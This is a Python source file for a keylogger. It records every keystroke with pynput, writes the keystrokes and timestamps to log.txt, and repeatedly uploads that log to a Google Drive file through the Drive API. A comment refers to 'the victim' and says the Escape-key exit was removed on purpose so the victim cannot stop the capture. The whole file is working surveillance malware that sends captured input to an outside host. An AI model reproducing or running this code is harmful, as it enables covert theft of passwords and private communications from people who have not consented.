# python input
# installing it: pip install pynput
# https://pypi.org/project/pynput/

# for keylog
from typing import get_type_hints
import pynput
from pynput.keyboard import Key, Listener

# for google drive
from googleapiclient.http import MediaFileUpload
from Google import Create_Service

# miscellaneous
import time
import threading
from os import device_encoding, listdir
from os.path import isfile, join
import os
import shutil

# ====================================== Global variables - Keylogs    ======================================
# buffer is used to temporarily hold user input from keylogs
buffer = []
# f is the file object for log.txt
f = open("log.txt", "a")


# ====================================== Global variables - Google Drive ======================================
# Google's client instance
CLIENT_SECRET_FILE = 'Client_Secret_File.json'
API_NAME = 'drive'
API_VERSION = 'v3'
# this has all the permissions and scopes inside
SCOPES = ['https://www.googleapis.com/auth/drive']

# creates the Google 
service = Create_Service(CLIENT_SECRET_FILE, API_NAME, API_VERSION, SCOPES)

# uploading file and picture: https://developers.google.com/drive/api/v3/reference/files/create
# google drive folder ids
# you find this in the folder's url
log_folder_id = '1MgrEip9JhSQ3sWIwxeafF7cPdC1Gs_2t'

file_log = ["log.txt"]
# you need to find the folder, read their names then loop through them

# https://learndataanalysis.org/commonly-used-mime-types/
# mime_types = ['text/plain', 'image/png']

# ====================================== Helper functions - Keylogs      ======================================
def on_press(key):
    char = str(key)
    # push this into a buffer then pass it to the log.txt file
    if "Key." in char:
        temp = char.replace("Key.", "", 1)
        char = temp
    else:
        char = char[:-1:]
        char = char[1 : : ]
    print("on press " + char)
    
    if char == 'space':
        char = " "

    buffer.append(char)
    # when the buffer hits 60 characters, write it into the log.txt file
    # however, it is a bit weird to have a bunch of characters that are put together because it will not be something formated
    if len(buffer) > 60:
        print("writing to file")
        string = ""
        for c in buffer:
            string = string + c
        print(string)
        f.write(string)
        buffer.clear()
        f.flush()
        send_log()


def on_release(key):
    # unnecessary because i do not want the victim to be able to kill the loop with esc
    # if its esc, it will kill the loop
    # if key == pynput.keyboard.Key.esc:
    #     f.close()
    #     return False
    pass

# ====================================== Helper functions - Google Drive ======================================
# takes the log.txt then sends to the google drive
def send_log():
    # the unique identifier for the log.txt file on the google drive
    log_file_id = '1G9ZuziyoBpfvXPN5QPSpXSvI_g4-UTl0'
    media_content = MediaFileUpload('./log.txt', mimetype='text/plain')
    service.files().update(
        fileId = log_file_id,
        media_body = media_content
    ).execute()
    print("Wrote to log.txt (Google Drive)")
    pass


def keylog():
    # a loop. This is an event listener which takes in two functions which passes on the keys pressed to the functions above
    with Listener(on_press=on_press, on_release = on_release) as listener:
        listener.join()

def timer():
    while True:
        time.sleep(10)
        current_time = time.localtime()
        formatted_time = '\n'+time.strftime("%I %M %S %p", current_time) + '\n'
        print("timer current time is "+formatted_time)
        f.write(formatted_time)
        f.flush()

# creating then calling threads
t1 = threading.Thread(target=keylog)
t2 = threading.Thread(target=timer)
t1.start()
t2.start()

